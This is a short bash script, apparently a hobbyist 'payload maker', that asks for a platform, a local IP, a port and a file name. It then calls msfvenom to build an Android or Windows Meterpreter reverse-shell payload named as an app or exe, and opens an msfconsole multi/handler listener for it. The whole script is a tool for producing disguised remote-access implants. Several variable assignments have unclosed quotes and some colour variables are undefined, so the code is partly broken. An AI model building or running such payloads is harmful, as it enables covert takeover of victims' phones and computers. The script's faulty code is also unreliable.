#!/bin/bash

#resize windows
resize -s 70 100 > /dev/null
#colors
   cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
White=${Escape}[0m";
RedF=${Escape}[31m";
GreenF=${Escape}[32m";
LightGreenF=${Escape}[92m"
YellowF=${Escape}[33m";
BlueF=${Escape}[34m";
CyanF=${Escape}[36m";
Reset=${Escape}[0m";
clear
echo
echo -e $CyanF"======================================================================================================================"
echo -e $Red"  ________  ________  ________          ________  ________      ___    ___ ___       ________  ________  ________   "  
echo -e $Red" |\   ____\|\   ____\|\   ____\        |\   __  \|\   __  \    |\  \  /  /|\  \     |\   __  \|\   __  \|\   ___ \   " 
echo -e $Red"  \ \  \___|\ \  \___|\ \  \___|        \ \  \|\  \ \  \|\  \   \ \  \/  / | \  \    \ \  \|\  \ \  \|\  \ \  \_|\ \   "
echo -e $Red"   \ \  \____\ \  \____\ \  \____        \ \   ____\ \   __  \   \ \    / / \ \  \    \ \  \\\  \ \   __  \ \  \ \\ \  "
echo -e $Red"    \ \  ___  \ \  ___  \ \  ___  \       \ \  \___|\ \  \ \  \   \/  /  /   \ \  \____\ \  \\\  \ \  \ \  \ \  \_\\ \ "
echo -e $Red"     \ \_______\ \_______\ \_______\       \ \__\    \ \__\ \__\__/  / /      \ \_______\ \_______\ \__\ \__\ \_______\ "
echo -e $Red"      \|_______|\|_______|\|_______|        \|__|     \|__|\|__|\___/ /        \|_______|\|_______|\|__|\|__|\|_______| "
echo -e $Red" XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # Made By skitz # XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
echo
echo "android"
echo "windows"
echo -e $blue "ENTER YOUR PAYLOAD TYPE"
read tp
echo
echo
echo -e $YellowF "ENTER YOUR LOCAL IP FOR LHOST"                                                                                             
read lh
echo
echo "enter payload type"
echo "reverse_tcp"
echo "reverse_http"
read at
echo
echo -e $lightgreen "ENTER YOUR DESIRED LPORT"
read lport
echo
echo
echo -e $Magenta "enter your app or exe file name [with extention]"
read app
msfvenom -p $tp/meterpreter/$at LHOST=$lh LPORT=$lport R>$app
echo "____________________________Creating Payload__________________"
xterm -T "666_payloads" -geometry 110x70 -e "sudo msfconsole 'use exploit/multi/handler; set LHOST $lh; set LPORT $lport; exploit -j'"                                                                        
